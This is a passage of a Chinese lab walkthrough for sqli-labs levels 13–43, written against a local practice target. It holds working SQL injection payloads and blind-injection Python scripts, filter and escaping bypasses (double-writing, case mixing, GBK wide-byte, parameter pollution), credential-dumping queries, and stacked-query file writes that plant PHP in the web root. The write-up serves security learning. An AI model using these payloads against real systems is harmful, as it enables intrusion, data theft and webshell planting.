+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-13/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        data = {
+            "uname" : "1",
+            "passwd" : "1", 
+            "submit" : "Submit"
+        }
+        # 爆库
+        # data['uname'] = "1') or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
+        # 爆表
+        data['uname'] = "1') or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
+        # 爆字段
+        # data['uname'] = "1') or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
+
+        start = time.time()
+        resp = requests.post(url,data=data)
+        # print(data['uname'])
+        # print(resp.text)
+        # exit()
+        end = time.time()
+        if end - start &gt; 0.1:
+            flag += s
+            # 当盲注出正确字符时，才去盲注下一位(变量i的作用)
+            i += 1
+            print(f"[#]------result: {flag}")
+            break
+        elif end - start &gt; 2:
+            print("跑了这么久，跑完了吗？跑完我给你停了🤓👍")
+            exit()
+        else:
+            pass</code></pre>
+<p><img src="/images/sqli-labs/25.png" alt="25" decoding="async" loading="lazy" width="1455" height="850"></p>
+<h2>Less-14</h2>
+<p>在这里突然发现会报错，试试报错注入</p>
+<p><code>updatexml</code>、<code>extractvalue</code>函数都可以正常报错注入</p>
+<pre><code class="language-sql">uname=0' or extractvalue(1,concat(0x7e,database(),0x7e))#</code></pre>
+<p><img src="/images/sqli-labs/26.png" alt="26" decoding="async" loading="lazy" width="1026" height="378"></p>
+<p><code>mysql_error()</code>放出来了？那上面几题是不是也能报错注入？我去试试☝🤓</p>
+<p><img src="/images/sqli-labs/27.png" alt="27" decoding="async" loading="lazy" width="985" height="502"></p>
+<h2>Less-15</h2>
+<p>我测，这里什么提示、回显都没有，报错也没有。试试时间盲注</p>
+<p>在传入这个payload时，页面长时间加载，说明存在时间盲注，语法也对上了</p>
+<pre><code class="language-sql">passwd=1&amp;submit=Submit&amp;uname=1' or if(1=1,sleep(5),sleep(5))#</code></pre>
+<p>我入</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-15/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        data = {
+            "uname" : "1",
+            "passwd" : "1", 
+            "submit" : "Submit"
+        }
+        # 爆库
+        # data['uname'] = "1' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
+        # 爆表
+        # data['uname'] = "1' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
+        # 爆字段
+        data['uname'] = "1' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
+        # 爆数据
+        # data['uname'] = "1' or if((substr((select group_concat(username,password) from users)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)#"
+        start = time.time()
+        resp = requests.post(url,data=data)
+        # print(data['uname'])
+        # print(resp.text)
+        # exit()
+        end = time.time()
+        if end - start &gt; 0.1:
+            flag += s
+            # 当盲注出正确字符时，才去盲注下一位(变量i的作用)
+            i += 1
+            print(f"[#]------result: {flag}")
+            break
+        elif end - start &gt; 2:
+            print("跑了这么久，跑完了吗？跑完我给你停了🤓👍")
+            exit()
+        else:
+            pass</code></pre>
+<h2>Less-16</h2>
+<p>在尝试这个payload时，页面进入长时间加载状态，说明存在时间盲注</p>
+<p><img src="/images/sqli-labs/28.png" alt="28" decoding="async" loading="lazy" width="841" height="735"></p>
+<pre><code class="language-sql">passwd=1&amp;submit=Submit&amp;uname=1") or if(1=1,sleep(5),sleep(5))#</code></pre>
+<h2>Less-17 update模块</h2>
+<p>这里，需要一个用户名和一个新密码，猜测后台sql语句类似</p>
+<pre><code class="language-php">$uname = $_POST['uname'];
+$passwd = $_POST['passwd'];
+$sql = "update users set password = '$passwd' where username = '$uname'";</code></pre>
+<p>传入单引号参数<code>passwd</code>，页面报错</p>
+<p><img src="/images/sqli-labs/29.png" alt="29" decoding="async" loading="lazy" width="1580" height="366"></p>
+<p>这里为什么用户名不能注入？翻看源码</p>
+<p><img src="/images/sqli-labs/30.png" alt="30" decoding="async" loading="lazy" width="787" height="630"></p>
+<p>好好好，这么玩</p>
+<p>那就从参数<code>passwd</code>入手，页面会报错，使用报错注入</p>
+<pre><code class="language-sql">passwd=1' or updatexml(1,concat(0x7e,user(),0x7e),1)#&amp;submit=Submit&amp;uname=0</code></pre>
+<p><img src="/images/sqli-labs/31.png" alt="31" decoding="async" loading="lazy" width="1175" height="610"></p>
+<h2>Less-18 HTTP Header</h2>
+<p>翻看源码学习一下,<code>uname</code>、<code>passwd</code>参数都做了检查，另外，使用<code>insert</code>语句，把用户的<code>ip</code>、<code>user-agent</code>插入到一个<code>security.uagents</code>表里</p>
+<p><img src="/images/sqli-labs/32.png" alt="32" decoding="async" loading="lazy" width="464" height="141"></p>
+<p><img src="/images/sqli-labs/33.png" alt="33" decoding="async" loading="lazy" width="990" height="210"></p>
+<p>这里没有做过滤，直接把用户http报头字段插入表里</p>
+<pre><code class="language-php">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";</code></pre>
+<p>插入的语句一般是成功插入一条语句，没什么回显，继续往下读源码发现<code>print_r(mysql_error());</code>，抛出错误，那么就可以利用报错注入</p>
+<p>有个尿点，这里如果用户不存在，那也就不会进入保存用户的<code>ip</code>、<code>ua</code>阶段，也没办法利用报错注入</p>
+<p>这里使用<code>hackbar</code>演示，先提交一次用户名，密码。用户需要是存在的，使用<code>admin</code>用户，密码随意</p>
+<p>在hackbar获取数据包，修改<code>User-Agent</code>字段，测试单引号，页面报错，尝试闭合语句</p>
+<p><img src="/images/sqli-labs/34.png" alt="34" decoding="async" loading="lazy" width="1806" height="775"></p>
+<p>看到<code>ua</code>字段后面爆出了<code>ip</code>、<code>uname</code>，以及一个右括号<code>)</code></p>
+<p>所以可以尝试闭合，注释掉后面原有内容</p>
+<pre><code class="language-sql">a',1,2)#</code></pre>
+<p>没有语法错误，页面正常，没有语法错误，可以尝试报错注入了</p>
+<p><img src="/images/sqli-labs/35.png" alt="35" decoding="async" loading="lazy" width="1801" height="614"></p>
+<pre><code class="language-sql">a',1,updatexml(1,concat(0x7e,user(),0x7e),1))#</code></pre>
+<p><img src="/images/sqli-labs/36.png" alt="36" decoding="async" loading="lazy" width="577" height="108"></p>
+<h2>Less-19</h2>
+<p>尝试在<code>referer</code>字段注入</p>
+<p><img src="/images/sqli-labs/37.png" alt="37" decoding="async" loading="lazy" width="1361" height="564"></p>
+<p>在报错语句里可以看到<code>192.168.6.148')</code>，说明<code>referer</code>字段后面还有一个字段才进行闭合</p>
+<p>尝试补充字段、闭合语句、注释后面</p>
+<pre><code class="language-sql">http://192.168.6.246:8080/Less-19/',1,updatexml(1,concat(0x7e,user(),0x7e),1))#</code></pre>
+<p><img src="/images/sqli-labs/38.png" alt="38" decoding="async" loading="lazy" width="835" height="116"></p>
+<h2>Less-19</h2>
+<p>在尝试<code>admin</code>用户登录后，加载数据包，尝试修改<code>referer</code>、<code>user-agent</code>、<code>cookie</code>字段</p>
+<p>在<code>cookie</code>字段传入单引号时，页面报错<code>'admin'' LIMIT 0,1</code>，多出一个单引号</p>
+<p>闭合，在<code>cookie</code>字段报错注入</p>
+<pre><code class="language-sql">uname=admin' or updatexml(1,concat(0x7e,user(),0x7e),1)#</code></pre>
+<h2>Less-20</h2>
+<p>在cookie里传入单引号，页面报错，可以看到爆出的后半句sql语句</p>
+<p><img src="/images/sqli-labs/39.png" alt="39" decoding="async" loading="lazy" width="1230" height="608"></p>
+<pre><code class="language-sql">'admin'' LIMIT 0,1</code></pre>
+<p>cookie里<code>uname</code>字段使用不存在的用户名，可以利用联合查询，存在回显位，<code>order by 4</code>可以测试出查询字段长度为3</p>
+<pre><code class="language-sql">uname=a' union select 11,22,33#</code></pre>
+<p><img src="/images/sqli-labs/40.png" alt="40" decoding="async" loading="lazy" width="1131" height="747"></p>
+<h2>Less-21</h2>
+<p>登录后，加载数据包<code>cookie: uname=YWRtaW4%3D</code></p>
+<p>后面看不出是什么数据，竟然是base64编码，解码后是<code>admin</code></p>
+<p>传入一个<code>admin'</code>，base64编码后发包，页面报错</p>
+<p><img src="/images/sqli-labs/41.png" alt="41" decoding="async" loading="lazy" width="1017" height="530"></p>
+<pre><code class="language-sql">'admin'') LIMIT 0,1</code></pre>
+<p>闭合单引号、括号，使用联合查询，uname值进行base64编码</p>
+<pre><code class="language-sql">uname=a') union select 11,22,33#</code></pre>
+<p><img src="/images/sqli-labs/42.png" alt="42" decoding="async" loading="lazy" width="1088" height="593"></p>
+<p>尝试写入文件，这里php文件内容使用16进制编码</p>
+<pre><code class="language-sql">uname=a') union select 11,22,0x3c3f3d706870696e666f28293b3f3e into outfile '/var/www/html/Less-21/4.php'#</code></pre>
+<p><img src="/images/sqli-labs/43.png" alt="43" decoding="async" loading="lazy" width="1005" height="349"></p>
+<h2>Less-22</h2>
+<p>同上一关，单引号换为双引号类型了，没有括号包裹</p>
+<pre><code class="language-sql">uname=a" union select 11,22,0x3c3f3d706870696e666f28293b3f3e into outfile '/var/www/html/Less-22/1.php'#</code></pre>
+<h2>Less-23</h2>
+<p>一直绕过不去，看看源码，把原来用来注释掉后面内容的注释符给过滤掉了</p>
+<p><img src="/images/sqli-labs/44.png" alt="44" decoding="async" loading="lazy" width="532" height="147"></p>
+<p>现在也可以sql注入，payload最后留个单引号闭合原有的单引号就可以了</p>
+<pre><code class="language-sql">?id=a' or 1='1</code></pre>
+<p><img src="/images/sqli-labs/45.png" alt="45" decoding="async" loading="lazy" width="790" height="294"></p>
+<p>这里不能使用order by测字段个数了</p>
+<pre><code class="language-sql">?id=0' union select 1,2,3,'4</code></pre>
+<p><img src="/images/sqli-labs/46.png" alt="46" decoding="async" loading="lazy" width="936" height="325"></p>
+<p><img src="/images/sqli-labs/47.png" alt="47" decoding="async" loading="lazy" width="775" height="339"></p>
+<p>套个子查询拿数据</p>
+<pre><code class="language-sql">?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'3</code></pre>
+<p><img src="/images/sqli-labs/48.png" alt="48" decoding="async" loading="lazy" width="1578" height="299"></p>
+<h2>Less-24</h2>
+<p>查看题目源码，注册功能上没有sql注入，即是有特殊字符，也会转义</p>
+<pre><code class="language-php">$username=  mysql_escape_string($_POST['username']) ;
+$pass= mysql_escape_string($_POST['password']);
+$re_pass= mysql_escape_string($_POST['re_password']);
+$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";</code></pre>
+<p>在密码修改功能上也使用了转义，</p>
+<pre><code class="language-php">$username= $_SESSION["username"];
+$curr_pass= mysql_real_escape_string($_POST['current_password']);
+$pass= mysql_real_escape_string($_POST['password']);
+$re_pass= mysql_real_escape_string($_POST['re_password']);
+$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";</code></pre>
+<p>可以通过注册一个<code>admin'#</code>用户，虽然字符被转义了利用不了，但是可以在密码修改功能里，用户名没有使用转义，拼接进去时可以直接利用</p>
+<p>思路：注册一个用户，用户名使用<code>admin'#</code>，密码随意，在密码修改时，利用sql语句漏洞来修改用户<code>admin</code>的密码</p>
+<p>用户<code>admin'#</code>在修改密码时，sql语句变成</p>
+<pre><code class="language-sql">UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' </code></pre>
+<p>通过修改用户<code>admin'#</code>的密码，来修改用户<code>admin</code>的密码</p>
+<p><img src="/images/sqli-labs/49.png" alt="49" decoding="async" loading="lazy" width="1087" height="570"></p>
+<h2>Less-25</h2>
+<pre><code class="language-php">$id= preg_replace('/or/i',"", $id);
+$id= preg_replace('/AND/i',"", $id);</code></pre>
+<p>查看源码，题目过滤了<code>or</code>、<code>adn</code>，也可以通过测试的报错语句猜测过滤黑名单</p>
+<ul>
+<li>传入<code>?id=1'</code>，报错：<code>'1'' LIMIT 0,1</code></li>
+<li>传入<code>?id=1'#</code>，不报错</li>
+<li>传入<code>?id=1' or 1=1#</code>，报错：<code>1=1#' LIMIT 0,1</code></li>
+</ul>
+<p>后面的注释肯定是生效的，不会因为后面的语句报错</p>
+<p>没有从<code>1'</code>开始报错，说明<code>1'</code>也成功闭合了</p>
+<p>没有回显<code>1'</code>后的<code>or</code>，直接回显了<code>1=1#</code>，说明<code>or</code>被替换为空了</p>
+<p>尝试双写，里一层外一层，在匹配到里面一层并替换为空时，外面一层or成为新的or，也可以适用到其他关键字被一次过滤时</p>
+<pre><code class="language-sql">oorr  &gt;  or
+selselectect  &gt;  select  # 在一个select里的任意位置再写一个select</code></pre>
+<p>这题可以直接联合查询</p>
+<pre><code class="language-sql">?id=0' union select 1,2,3%23</code></pre>
+<p><img src="/images/sqli-labs/50.png" alt="50" decoding="async" loading="lazy" width="854" height="327"></p>
+<p>考察双写绕过</p>
+<pre><code class="language-sql">?id=0' oorr updatexml(1,concat(0x7e,user(),0x7e),1)%23</code></pre>
+<p><img src="/images/sqli-labs/51.png" alt="51" decoding="async" loading="lazy" width="870" height="394"></p>
+<h2>Less-25a</h2>
+<p>整型注入，过滤了<code>or</code>、<code>and</code></p>
+<p>测试发现单双引号不会报错，报错注入不可行，可以使用联合查询，测试过程</p>
+<pre><code class="language-sql">?id=0 union select 1,2,3#</code></pre>
+<p>题目名称提示使用<code>or</code>、<code>and</code>盲注，写个脚本试试</p>
+<pre><code class="language-python">import requests
+import string
+import time
+# 下划线放最后，避免当作统配符吃掉特殊字符
+flags = 'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'
+flag = ""
+
+url = "http://127.0.0.1:8080/Less-25a/"
+i = 1
+print("脚本正在运行.......")
+while True:
+
+    for s in flags:
+        # 爆库
+        id = "0 oorr if((substr((select group_concat(schema_name) from infoorrmation_schema.schemata)," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆表
+        # id = "0 oorr if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        # 爆字段
+        # id = "0 oorr if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database())," + str(i)+",1)='"+ s +"'),sleep(0.1),0)%23"
+        tmp_url = url + "?id=" + id
+        start = time.time()
+        resp = requests.get(tmp_url)
+        end = time.time()
+        if end - start &gt; 0.1:
+            flag += s
+            # 当盲注出正确字符时，才去盲注下一位(变量i的作用)
+            i += 1
+            print(f"[#]------result: {flag}")
+            break
+        elif end - start &gt; 2:
+            print("跑了这么久，跑完了吗？跑完我给你停了🤓👍")
+            exit()
+        else:
+            pass</code></pre>
+<p><img src="/images/sqli-labs/52.png" alt="52" decoding="async" loading="lazy" width="1074" height="652"></p>
+<h2>Less-26</h2>
+<p>题目名称提示过滤了空格、注释、以及前面的<code>or</code>、<code>and</code></p>
+<p>因为是get传参，还可以使用<code>%09</code>、<code>%0a</code>、<code>%0b</code>、<code>%0c</code>、<code>%0d</code>、<code>%a0</code>绕过</p>
+<p>我测，通过报错发现这里的sql语句<code>'1'' LIMIT 0,1</code>，是单引号包裹的id</p>
+<p>发现这题可以用<code>$0b</code>，<code>%a0</code>替换空格</p>
+<pre><code class="language-sql">?id=0'union%0bselect%0b1,2,'3</code></pre>
+<p>爆表，注意单词<code>information_schema</code>里有个<code>or</code>，也要双写</p>
+<pre><code class="language-sql">?id=0'union%0bselect%0b1,(select%0bgroup_concat(table_name)%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()),'3</code></pre>
+<h2>Less-26a</h2>
+<p>相比上关，添加了<code>()</code>包裹<code>id</code>，因为不能使用注释符，所以需要考虑闭合后，后面的<code>')</code>怎么处理</p>
+<p>也好处理，可以<code>select 1,2,('3')</code>的形式，闭合后面的<code>')</code>，避免语法错误无法执行</p>
+<pre><code class="language-sql">?id=0')union%0bselect%0b1,(select%0bgroup_concat(table_name)%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()),('3</code></pre>
+<p><img src="/images/sqli-labs/53.png" alt="53" decoding="async" loading="lazy" width="1110" height="337"></p>
+<h2>Less-27</h2>
+<p>过滤语句，过滤空格、注释符、union、select等，把or、and放出来了</p>
+<pre><code class="language-php">$id= preg_replace('/[\/\*]/',"", $id);
+$id= preg_replace('/[--]/',"", $id);
+$id= preg_replace('/[#]/',"", $id);
+$id= preg_replace('/[ +]/',"", $id);
+$id= preg_replace('/select/m',"", $id);
+$id= preg_replace('/[ +]/',"", $id);
+$id= preg_replace('/union/s',"", $id);
+$id= preg_replace('/select/s',"", $id);
+$id= preg_replace('/UNION/s',"", $id);
+$id= preg_replace('/SELECT/s',"", $id);
+$id= preg_replace('/Union/s',"", $id);
+$id= preg_replace('/Select/s',"", $id);</code></pre>
+<p>大小写混写绕过</p>
+<pre><code class="language-sql">?id=0'unIon%0bselEct%0b1,(seleCt%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),'3</code></pre>
+<p><img src="/images/sqli-labs/55.png" alt="55" decoding="async" loading="lazy" width="1352" height="342"></p>
+<h2>Less-27a</h2>
+<p>双引号类型，其他似乎都一样</p>
+<pre><code class="language-sql">?id=0"%0bUnIon%0bSeLeCt%0b1,(seLect%0bgroup_concat(schema_name)%0bfrom%0binformation_schema.schemata),"3</code></pre>
+<p><img src="/images/sqli-labs/54.png" alt="54" decoding="async" loading="lazy" width="1348" height="349"></p>
+<h2>Less-28</h2>
+<p>不区分大小写来过滤，会把<code>union*select</code>不区分大小写的过滤掉</p>
+<pre><code class="language-php">$id= preg_replace('/[\/\*]/',"", $id);
+$id= preg_replace('/[--]/',"", $id);
+$id= preg_replace('/[#]/',"", $id);
+$id= preg_replace('/[ +]/',"", $id);
+$id= preg_replace('/[ +]/',"", $id);
+$id= preg_replace('/union\s+select/i',"", $id);</code></pre>
+<p>测试回显来判断后台sql语句应该是<code>')</code>包裹的</p>
+<pre><code class="language-sql">?id=0')%0bor%0b1=('1</code></pre>
+<p><img src="/images/sqli-labs/56.png" alt="56" decoding="async" loading="lazy" width="1017" height="333"></p>
+<p>畸形双写绕过，<code>union</code>里套一个<code>union%0aselect</code>，利用正则吞掉里面的<code>union\sselect</code>，太奇怪了，正则<code>union\sselect</code>里的<code>\s</code>不能匹配<code>%0b</code></p>
+<pre><code class="language-sql">?id=0')%0buniounion%0aselectn%0bselect%0b1,2,('3</code></pre>
+<p><img src="/images/sqli-labs/57.png" alt="57" decoding="async" loading="lazy" width="1031" height="447"></p>
+<p>爆库</p>
+<pre><code class="language-sql">?id=0')%0buniounion%0aselectn%0bselect%0b1,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),('3</code></pre>
+<h2>Less-28a</h2>
+<p>翻阅源码，过滤减少了。测试思路同上题</p>
+<pre><code class="language-sql">?id=0')uNIounion%0aselectn%a0select%0a1,2,('3</code></pre>
+<h2>Less-29 HTTP参数污染</h2>
+<p>我去，这关有意思，先看看源码</p>
+<p>把url参数id的值赋给$query_string，然后以&amp;分割成数组，然后取id的值</p>
+<pre><code class="language-php">// 把url参数id的值赋给$query_string，然后以&amp;分割成数组，然后取id的值
+function java_implimentation($query_string)
+{
+    $q_s = $query_string;
+    $qs_array= explode("&amp;",$q_s);
+    foreach($qs_array as $key =&gt; $value)
+    {
+        $val=substr($value,0,2);
+        if($val=="id")
+        {
+            $id_value=substr($value,3,30); 
+            return $id_value;
+            echo "&lt;br&gt;";
+            break;
+        }
+    }
+}</code></pre>
+<p>测试：尝试传入<code>?id=1&amp;id=2</code>，可以发现页面显示的用户名不再是<code>Dumb</code>，而实<code>Angelina</code></p>
+<p>这关 login.php 设置了一个白名单WAF，只允许数字，不过获取匹配的参数 $_SERVER['QUERY_STRING'] 然后匹配到第一个 id 就 break 掉了。但 PHP 通过 $_GET['id'] 获取是覆盖关系，即同时存在多个URL参数时，只获取最后一个。但WAF判断的是第1个，所以就可以绕过了。这种方式也叫HPP，HTTP 参数污染</p>
+<pre><code class="language-sql">?id=1&amp;id=0'union select 1,2,3%23</code></pre>
+<p><img src="/images/sqli-labs/58.png" alt="58" decoding="async" loading="lazy" width="910" height="318"></p>
+<h2>Less-30</h2>
+<p>同上关有些不同，需要在新的参数<code>id</code>里进行原sql语句的闭合测试</p>
+<p>这题是双引号类型</p>
+<pre><code class="language-sql">?id=1&amp;id=0"union select 1,2,3%23</code></pre>
+<p><img src="/images/sqli-labs/59.png" alt="59" decoding="async" loading="lazy" width="941" height="314"></p>
+<h2>Less-31</h2>
+<p>测试闭合原sql语句</p>
+<pre><code class="language-sql">?id=1&amp;id=0")union select 1,2,3%23</code></pre>
+<p><img src="/images/sqli-labs/60.png" alt="60" decoding="async" loading="lazy" width="971" height="358"></p>
+<h2>Less-32 宽字节注入</h2>
+<p>源码里，通过转义过滤了传入的单双引号，避免拼接到sql语句里成为闭合符</p>
+<pre><code class="language-php">function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);
+    $string = preg_replace('/\'/i', '\\\'', $string);   
+    $string = preg_replace('/\"/', "\\\"", $string);
+    return $string;
+}</code></pre>
+<p>通过转义来实现过滤单双引号的安全措施，可以宽字节注入绕过，引用<code>mysql注入天书</code>作者对宽字节注入的解释</p>
+<p><img src="/images/sqli-labs/61.png" alt="61" decoding="async" loading="lazy" width="1182" height="628"></p>
+<pre><code class="language-sql">?id=1%df'</code></pre>
+<p><img src="/images/sqli-labs/62.png" alt="62" decoding="async" loading="lazy" width="915" height="252"></p>
+<p>传入id后，单引号被转义<code>\'</code>，在mysql使用gbk编码时，两个字节作为一个汉字，在<code>%df</code>遇到<code>%5c</code>时，会把<code>%df%5c</code>看作一个汉字<code>運</code>，吞掉了<code>%5c</code>的转义作用，绕过了过滤</p>
+<p><img src="/images/sqli-labs/63.png" alt="63" decoding="async" loading="lazy" width="540" height="268"></p>
+<p>发现sql语句转换16进制时，转义字符<code>\</code>被系统吃了，逆天，补一个5c</p>
+<p>前面做题多了，可以知道单引号是<code>27</code>，找到两个27大概就是要找的单引号，补一个<code>5c</code></p>
+<p><img src="/images/sqli-labs/65.png" alt="65" decoding="async" loading="lazy" width="1216" height="450"></p>
+<p>补充<code>df</code>，看<code>df5c</code>的效果</p>
+<p><img src="/images/sqli-labs/64.png" alt="64" decoding="async" loading="lazy" width="1173" height="378"></p>
+<p>现在可以知道，<code>0xdf</code>和<code>0x5c</code>两个字节在一起会解释为一个汉字<code>運</code>。在url就是<code>%df</code>、<code>%5c</code></p>
+<p>直接高强度日站</p>
+<pre><code class="language-sql">?id=0%df'union select 11,22,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23</code></pre>
+<p><img src="/images/sqli-labs/66.png" alt="66" decoding="async" loading="lazy" width="1660" height="353"></p>
+<h2>Less-33</h2>
+<p>和上题有区别吗？好像没有，区别是上关是出题人自己定义一个转义函数，这里使用自带的<code>addslashes</code>函数</p>
+<pre><code class="language-sql">?id=0%df' union select 1,2,3%23</code></pre>
+<p><img src="/images/sqli-labs/67.png" alt="67" decoding="async" loading="lazy" width="400" height="115"></p>
+<h2>Less-34 POST</h2>
+<p>这道题使用post方式提交参数，用bp抓包提交</p>
+<pre><code class="language-sql">uname=0%df'union%20select%20version(),user()%23&amp;passwd=1'&amp;submit=Submit</code></pre>
+<p><img src="/images/sqli-labs/68.png" alt="68" decoding="async" loading="lazy" width="1528" height="938"></p>
+<h2>Less-35</h2>
+<p>提示整型注入，好像什么过滤也没有？</p>
+<p><img src="/images/sqli-labs/69.png" alt="69" decoding="async" loading="lazy" width="1082" height="582"></p>
+<h2>Less-36</h2>
+<p>题目提示<code>bypass mysql_real_escape_string</code>，绕过<code>mysql_real_escape_string</code>函数</p>
+<p>在<code>mysql注入天书</code>里，作者提到</p>
+<p><img src="/images/sqli-labs/70.png" alt="70" decoding="async" loading="lazy" width="1036" height="190"></p>
+<pre><code class="language-sql">?id=0%df'union select 1,2,3%23</code></pre>
+<p>如果要防范<code>MYSQL_real_escape_string</code>，需要把mysql设置为<code>gbk</code>编码，那么说，非gbk编码时，<code>mysql_real_escape_string</code>函数会像上面<code>addslashes</code>一样，转义但存在宽字节注入？</p>
+<p>翻看源码，发现，这题使用的就是<code>gbk</code>编码？？？</p>
+<p><img src="/images/sqli-labs/71.png" alt="71" decoding="async" loading="lazy" width="442" height="125"></p>
+<h2>Less-37</h2>
+<p>我入</p>
+<pre><code class="language-sql">uname=1%df'%20or%201=1%23&amp;passwd=1&amp;submit=Submit</code></pre>
+<p><img src="/images/sqli-labs/72.png" alt="72" decoding="async" loading="lazy" width="1330" height="937"></p>
+<p>🤯 转义的尽头是<code>%df</code>吗？</p>
+<h2>Less-38 堆叠注入</h2>
+<p>老天奶，终于到下一个页面了，堆叠注入</p>
+<p>oracle 不能使用堆叠注入，mysql、sqlserver、postgresql 都可以</p>
+<p>一直没有了解为什么有时候只能联合注入，有时候甚至可以对堆叠注入，学习下源码</p>
+<p>之前的注入执行语句</p>
+<pre><code class="language-php">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+$result=mysql_query($sql);</code></pre>
+<p>这题的堆叠注入语句</p>
+<pre><code class="language-php">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+/* execute multi query */
+if (mysqli_multi_query($con1, $sql))</code></pre>
+<p>相比，原来这里的<code>mysqli_multi_query</code>函数，可以执行多条sql语句，所以可以堆叠注入🤯</p>
+<p>联合查询就好像就够用了，我拿堆叠注入有什么新姿势？</p>
+<p>给站长留条数据☝🤓</p>
+<pre><code class="language-sql">?id=0' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database())%23
+?id=0' union select 1,2,(select group_concat(id,username,password) from users)%23
+?id=0';insert into users values(100,'imsb',22);%23</code></pre>
+<p><img src="/images/sqli-labs/75.png" alt="75" decoding="async" loading="lazy" width="1726" height="344"></p>
+<p>堆叠注入是不是可以执行任意sql语句</p>
+<p>打开日志记录，修改日志文件、目录，查询恶意字符串写入日志</p>
+<pre><code class="language-sql">?id=0';set global general_log='on';set global general_log_file='/var/www/html/Less-38/4.php';select 1,2, 0x3c3f3d706870696e666f28293b3f3e;%23</code></pre>
+<p>我测，这里为什么写进去没有解析🤯</p>
+<p>记录一下，sql堆叠注入通过日志写入木马流程</p>
+<pre><code class="language-sql"># 打开日志记录
+set global general_log='on';
+# 设置日志文件
+set global general_log_file='/var/www/html/Less-38/4.php';
+# 写入恶意字符串
+select 1,2, 0x3c3f3d706870696e666f28293b3f3e;</code></pre>
+<h2>Less-39</h2>
+<p>整型注入，尝试日志写马子还是失败了</p>
+<pre><code class="language-sql">?id=0;set global general_log='on';set global general_log_file='/var/www/html/Less-39/1.php';select 1,2, 0x3c3f3d706870696e666f28293b3f3e;%23</code></pre>
+<p>我直接进容器调试</p>
+<p>破案，mysql写的文件没有执行权限，我直接一个高权限战士</p>
+<pre><code class="language-bash">docker exec -it sqli-lab /bin/sh
+chmod 777 /var/www/html/Less-39/*.php</code></pre>
+<p><img src="/images/sqli-labs/76.png" alt="76" decoding="async" loading="lazy" width="602" height="290"></p>
+<p>这又是什么奇怪的报错 🤯</p>
+<p><img src="/images/sqli-labs/77.png" alt="77" decoding="async" loading="lazy" width="1398" height="124"></p>
+<p>重新写试试，还是不行，开溜！</p>
+<pre><code class="language-sql">?id=0;select '&lt;?=phpinfo();?&gt;' into outfile '/var/www/html/Less-39/2.php';</code></pre>
+<p><img src="/images/sqli-labs/78.png" alt="78" decoding="async" loading="lazy" width="986" height="246"></p>
+<h2>Less-40</h2>
+<p>通过页面回显可以测试出后台id是<code>')</code>包裹的</p>
+<pre><code class="language-sql">?id=1');</code></pre>
+<p>看<code>mysql注入天书</code>作者在经常使用<code>insert</code>语句，多用熟悉一下</p>
+<pre><code class="language-sql">?id=0');insert into users values(101,'imsb',666);%23</code></pre>
+<p><img src="/images/sqli-labs/79.png" alt="79" decoding="async" loading="lazy" width="964" height="391"></p>
+<h2>Less-41</h2>
+<p>整型注入</p>
+<pre><code class="language-sql">?id=1;insert into users values(103,'Jay','');%23</code></pre>
+<p><img src="/images/sqli-labs/80.png" alt="80" decoding="async" loading="lazy" width="848" height="295"></p>
+<h2>Less-42</h2>
+<p>查看源码，题目在登录的处理方面，对<code>username</code>做了过滤，<code>password</code>没有过滤</p>
+<p><img src="/images/sqli-labs/81.png" alt="81" decoding="async" loading="lazy" width="762" height="507"></p>
+<pre><code class="language-sql">login_password=1' or 1=1;select '&lt;?=phpinfo();?&gt;' into outfile '/var/www/html/Less-42/1.php';%23&amp;login_user=admin&amp;mysubmit=Login</code></pre>
+<p><img src="/images/sqli-labs/82.png" alt="82" decoding="async" loading="lazy" width="949" height="251"></p>
+<h2>Less-43</h2>
+<p>查看源码，整体逻辑没变，参数的拼接方式换成了<code>('')</code>包裹了</p>
+<p><img src="/images/sqli-labs/83.png" alt="83" decoding="async" loading="lazy" width="719" height="500"></p>
+<pre><code class="language-sql">login_password=1') or 1=1;select '&lt;?=phpinfo();?&gt;' into outfile '/var/www/html/Less-43/1.php';%23&amp;login_user=admin&amp;mysubmit=Login</code></pre>
